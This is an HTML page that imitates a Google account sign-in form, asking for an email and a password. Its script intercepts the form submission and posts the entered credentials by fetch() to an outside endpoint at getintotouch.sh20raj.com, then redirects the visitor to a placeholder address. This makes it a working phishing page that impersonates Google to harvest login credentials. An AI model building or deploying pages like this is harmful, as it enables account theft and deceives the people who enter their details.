<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Form</title>
    <link rel="stylesheet" href="google.css">
</head>
<body>

    <div class="box">
        <div class="logo">

        </div>
        <h2>Sign In</h2>
        <p>Use your Google Account</p>
        <form id="signInForm" onsubmit="submitForm(event)">
            <div class="inputBox">
                <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);" value="">
                <label>Email</label>
            </div>
            <div class="inputBox">
                <input type="text" name="text" required onkeyup="this.setAttribute('value', this.value);" value="">
                <label>Password</label>
            </div>
            <input type="submit" name="sign-in" value="Sign In">
        </form>
    </div>

    <script>
        function submitForm(event) {
            event.preventDefault(); // Prevent the default form submission
            
            // Get form data
            const formData = new FormData(document.getElementById('signInForm'));

            // Perform the asynchronous form submission
            fetch('https://getintotouch.sh20raj.com/api.php?id=6534651073', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    // If the response is successful, redirect to another page
                    window.location.href = 'https://your-redirect-url.com';
                } else {
                    console.error('Form submission failed');
                    // Handle unsuccessful submission if needed
                }
            })
            .catch(error => console.error('Error during form submission:', error));
        }
    </script>

</body>
</html>
